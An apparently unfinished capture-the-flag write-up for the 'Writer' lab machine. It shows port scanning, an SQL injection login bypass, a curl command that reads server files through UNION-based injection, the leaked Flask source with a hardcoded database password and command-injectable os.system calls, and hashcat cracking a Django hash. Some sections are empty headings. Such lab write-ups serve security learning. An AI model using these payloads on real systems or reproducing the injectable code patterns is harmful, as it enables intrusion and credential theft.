# Port Scanning 
`nmap` found 4 open TCP ports, SSH (22) , HTTP (80) , SMB (139,445):

```bash
# Nmap 7.91 scan initiated Sun Aug  1 08:48:33 2021 as: nmap -sC -sV -oN inital_scan.txt -v 10.10.11.101
Nmap scan report for 10.10.11.101
Host is up (0.058s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   WRITER<00>           Flags: <unique><active>
|   WRITER<03>           Flags: <unique><active>
|   WRITER<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active># Knowledge Gained

# Port Scanning
|_  WORKGROUP<1e>        Flags: <group><active>
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-01T02:48:47
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug  1 08:48:50 2021 -- 1 IP address (1 host up) scanned in 16.78 seconds

```

# Web Reconnaissance
I added writer.htb in `/etc/hosts` file with associated IP address. I visited `http://writer.htb` and it returns this:
![[writer-web_root.png]]
###### Content Discovery:
I used `ffuf`  for fuzzing web contents.
```bash
$ ffuf -w /opt/SecLists/Discovery/Web-Content/common.txt  -u http://writer.htb/FUZZ         

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://writer.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

contact                 [Status: 200, Size: 4899, Words: 242, Lines: 110]
logout                  [Status: 302, Size: 208, Words: 21, Lines: 4]
about                   [Status: 200, Size: 3522, Words: 250, Lines: 75]
static                  [Status: 301, Size: 309, Words: 20, Lines: 10]
dashboard               [Status: 302, Size: 208, Words: 21, Lines: 4]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10]
administrative          [Status: 200, Size: 1443, Words: 185, Lines: 35]
:: Progress: [4685/4685] :: Job [1/1] :: 388 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

![[writer-admin_login_page.png]]
<center>writer.htb/administrative</center>

# Exploitation
I tried some random username password combination. but did't work! Then I put SQLi Payload and bypassed Admin Login.
```sqli
username = admin' -- -
password = admin' -- -
```
![[writer-SQLi.png]]

Admin Dashboard Screenshot:

![[writer-admin_panel_bypass_with_SQLi.png]]

-------------
 I send admin login request to burp for harvesting database info.  There was total 6 columns and 2nd column executes our SQL Query.
 
 ![[writer-vulnerable_column.png]]
 
 
 Dumped Databases, but found nothing interesting there. then move forward for server side issue.
 
I was able to read local file using SQL `load_file()` function. 
 ![[writer-local_file_read-0.png]]
 
 After successfully reading `/etc/passwd`.  
 
 My next movement was reading Apache2 Configuration FIle. As I know from `nmap` scan,  target machine using apache2. 
 
 ![[writer-apache2_config_file_read.png]]
 
`/etc/apache2/sites-enabled/000-default.conf`

 ``` bash
 Welcome # Virtual host configuration for writer.htb domain
<VirtualHost *:80>
        ServerName writer.htb
        ServerAdmin admin@writer.htb
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
        <Directory /var/www/writer.htb>
                Order allow,deny
                Allow from all
        </Directory>
        Alias /static /var/www/writer.htb/writer/static
        <Directory /var/www/writer.htb/writer/static/>
                Order allow,deny
                Allow from all
        </Directory>
        ErrorLog ${APACHE_LOG_DIR}/error.log
        LogLevel warn
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

# Virtual host configuration for dev.writer.htb subdomain
# Will enable configuration after completing backend development
# Listen 8080
#<VirtualHost 127.0.0.1:8080>
#	ServerName dev.writer.htb
#	ServerAdmin admin@writer.htb
#
        # Collect static for the writer2_project/writer_web/templates
#	Alias /static /var/www/writer2_project/static
#	<Directory /var/www/writer2_project/static>
#		Require all granted
#	</Directory>
#
#	<Directory /var/www/writer2_project/writerv2>
#		<Files wsgi.py>
#			Require all granted
#		</Files>
#	</Directory>
#
#	WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env
#	WSGIProcessGroup writer2_project
#	WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py
#        ErrorLog ${APACHE_LOG_DIR}/error.log
#        LogLevel warn
#        CustomLog ${APACHE_LOG_DIR}/access.log combined
#
#</VirtualHost>
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
 ```

From `apache2 configuration file`, I got an overview how they manage web files for `writer.htb` domain. There is also an another domain named `dev.writer.htb` which is only accessible from localhost on port 8080. Now, My next thought was about getting reverse shell.

I was sure about the site was not made with php.  In apache2 configuration file saw something unusual `WSGIScript`. I googled about apache wsgi. 

>  What is Apache WSGI? 

 >  mod_wsgi is an Apache HTTP Server module by Graham Dumpleton that provides a WSGI compliant interface for hosting Python based web applications under Apache. As of version 4.5. ... It is an alternative to mod_python, CGI, and FastCGI solutions for Python-web integration. It was first available in 2007.

From there it was sure , website running with python based application under Apache.

without delay, I read `__init___.py` from `/var/www/writer.htb/writer/` .

``` bash
curl -X POST http://writer.htb/administrative --data "uname=admin'+and+0+union+select+1,load_file('/var/www/writer.htb/writer/__init__.py'),3,4,5,6--+-&password=admin"
```

```python
Welcome from flask import Flask, session, redirect, url_for, request, render_template
from mysql.connector import errorcode
import mysql.connector
import urllib.request
import os
import PIL
from PIL import Image, UnidentifiedImageError
import hashlib

app = Flask(__name__,static_url_path="",static_folder="static",template_folder="templates")

#Define connection for database
def connections():
    try:
        connector = mysql.connector.connect(user="admin", password="ToughPasswordToCrack", host="127.0.0.1", database="writer")
        return connector
    except mysql.connector.Error as err:
        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
            return ("Something is wrong with your db user name or password!")
        elif err.errno == errorcode.ER_BAD_DB_ERROR:
            return ("Database does not exist")
        else:
            return ("Another exception, returning!")
    else:
        print ("Connection to DB is ready!")

#Define homepage
@app.route("/")
def home_page():
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template("blog/blog.html", results=results)

#Define about page
@app.route("/about")
def about():
    return render_template("blog/about.html")

#Define contact page
@app.route("/contact")
def contact():
    return render_template("blog/contact.html")

#Define blog posts
@app.route("/blog/post/&lt;id&gt;", methods=["GET"])
def blog_post(id):
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    cursor.execute("SELECT * FROM stories WHERE id = %(id)s;", {"id": id})
    results = cursor.fetchall()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    stories = cursor.fetchall()
    return render_template("blog/blog-single.html", results=results, stories=stories)

#Define dashboard for authenticated users
@app.route("/dashboard")
def dashboard():
    if not ("user" in session):
        return redirect("/")
    return render_template("dashboard.html")

#Define stories page for dashboard and edit/delete pages
@app.route("/dashboard/stories")
def stories():
    if not ("user" in session):
        return redirect("/")
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    sql_command = "Select * From stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template("stories.html", results=results)

@app.route("/dashboard/stories/add", methods=["GET", "POST"])
def add_story():
    if not ("user" in session):
        return redirect("/")
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        if request.files["image"]:
            image = request.files["image"]
            if ".jpg" in image.filename:
                path = os.path.join("/var/www/writer.htb/writer/static/img/", image.filename)
                image.save(path)
                image = "/img/{}".format(image.filename)
            else:
                error = "File extensions must be in .jpg!"
                return render_template("add.html", error=error)

        if request.form.get("image_url"):
            image_url = request.form.get("image_url")
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image) 
                        im.verify()
                        im.close()
                        image = image.replace("/tmp/","")
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render_template("add.html", error=error)
                except:
                    error = "Issue uploading picture"
                    return render_template("add.html", error=error)
            else:
                error = "File extensions must be in .jpg!"
                return render_template("add.html", error=error)
        author = request.form.get("author")
        title = request.form.get("title")
        tagline = request.form.get("tagline")
        content = request.form.get("content")
        cursor = connector.cursor()
        cursor.execute("INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,"Published",now(),%(image)s);", {"author":author,"title": title,"tagline": tagline,"content": content, "image":image })
        result = connector.commit()
        return redirect("/dashboard/stories")
    else:
        return render_template("add.html")

@app.route("/dashboard/stories/edit/&lt;id&gt;", methods=["GET", "POST"])
def edit_story(id):
    if not ("user" in session):
        return redirect("/")
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {"id": id})
        results = cursor.fetchall()
        if request.files["image"]:
            image = request.files["image"]
            if ".jpg" in image.filename:
                path = os.path.join("/var/www/writer.htb/writer/static/img/", image.filename)
                image.save(path)
                image = "/img/{}".format(image.filename)
                cursor = connector.cursor()
                cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {"image":image, "id":id})
                result = connector.commit()
            else:
                error = "File extensions must be in .jpg!"
                return render_template("edit.html", error=error, results=results, id=id)
        if request.form.get("image_url"):
            image_url = request.form.get("image_url")
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image) 
                        im.verify()
                        im.close()
                        image = image.replace("/tmp/","")
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                        cursor = connector.cursor()
                        cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {"image":image, "id":id})
                        result = connector.commit()

                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render_template("edit.html", error=error, results=results, id=id)
                except:
                    error = "Issue uploading picture"
                    return render_template("edit.html", error=error, results=results, id=id)
            else:
                error = "File extensions must be in .jpg!"
                return render_template("edit.html", error=error, results=results, id=id)
        title = request.form.get("title")
        tagline = request.form.get("tagline")
        content = request.form.get("content")
        cursor = connector.cursor()
        cursor.execute("UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s", {"title":title, "tagline":tagline, "content":content, "id": id})
        result = connector.commit()
        return redirect("/dashboard/stories")

    else:
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {"id": id})
        results = cursor.fetchall()
        return render_template("edit.html", results=results, id=id)

@app.route("/dashboard/stories/delete/&lt;id&gt;", methods=["GET", "POST"])
def delete_story(id):
    if not ("user" in session):
        return redirect("/")
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        cursor = connector.cursor()
        cursor.execute("DELETE FROM stories WHERE id = %(id)s;", {"id": id})
        result = connector.commit()
        return redirect("/dashboard/stories")
    else:
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {"id": id})
        results = cursor.fetchall()
        return render_template("delete.html", results=results, id=id)

#Define user page for dashboard
@app.route("/dashboard/users")
def users():
    if not ("user" in session):
        return redirect("/")
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database Error"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM users;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template("users.html", results=results)

#Define settings page
@app.route("/dashboard/settings", methods=["GET"])
def settings():
    if not ("user" in session):
        return redirect("/")
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database Error!"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM site WHERE id = 1"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template("settings.html", results=results)

#Define authentication mechanism
@app.route("/administrative", methods=["POST", "GET"])
def login_page():
    if ("user" in session):
        return redirect("/dashboard")
    if request.method == "POST":
        username = request.form.get("uname")
        password = request.form.get("password")
        password = hashlib.md5(password.encode("utf-8")).hexdigest()
        try:
            connector = connections()
        except mysql.connector.Error as err:
            return ("Database error")
        try:
            cursor = connector.cursor()
            sql_command = "Select * From users Where username = "%s" And password = "%s"" % (username, password)
            cursor.execute(sql_command)
            results = cursor.fetchall()
            for result in results:
                print("Got result")
            if result and len(result) != 0:
                session["user"] = username
                return render_template("success.html", results=results)
            else:
                error = "Incorrect credentials supplied"
                return render_template("login.html", error=error)
        except:
            error = "Incorrect credentials supplied"
            return render_template("login.html", error=error)
    else:
        return render_template("login.html")

@app.route("/logout")
def logout():
    if not ("user" in session):
        return redirect("/")
    session.pop("user")
    return redirect("/")

if __name__ == "__main__":
   app.run("0.0.0.0")

```


# Reverse shell as www-data

# Post-Exploitation
- From www-data shell to $USER

# Privilege Escalation
- Enumeration

# Gainning Root User

Apache2 Domain Mapping Config PATH :  `/etc/apache2/sites-enabled/000-default.conf`

```bash
rahat@kali $ hashcat -m 10000 hashes.txt /usr/share/wordlists/rockyou.txt --force                                                                                                                                                          2 ⨯
hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
CUDA API (CUDA 11.4)
====================
* Device #1: NVIDIA GeForce GT 1030, 1533/2000 MB, 3MCU

OpenCL API (OpenCL 3.0 CUDA 11.4.94) - Platform #1 [NVIDIA Corporation]
=======================================================================
* Device #2: NVIDIA GeForce GT 1030, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 116 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Django (PBKDF2-SHA256)
Hash.Target......: pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8...uXM4A=
Time.Started.....: Mon Sep 27 16:50:00 2021, (18 secs)
Time.Estimated...: Mon Sep 27 16:50:18 2021, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      670 H/s (8.91ms) @ Accel:4 Loops:128 Thr:1024 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 12288/14344385 (0.09%)
Rejected.........: 0/12288 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:259968-259999
Candidates.#1....: 123456 -> hawkeye
Hardware.Mon.#1..: Temp: 65c Fan: 55% Util:100% Core:1746MHz Mem:3003MHz Bus:4

Started: Mon Sep 27 16:49:59 2021
Stopped: Mon Sep 27 16:50:19 2021
```
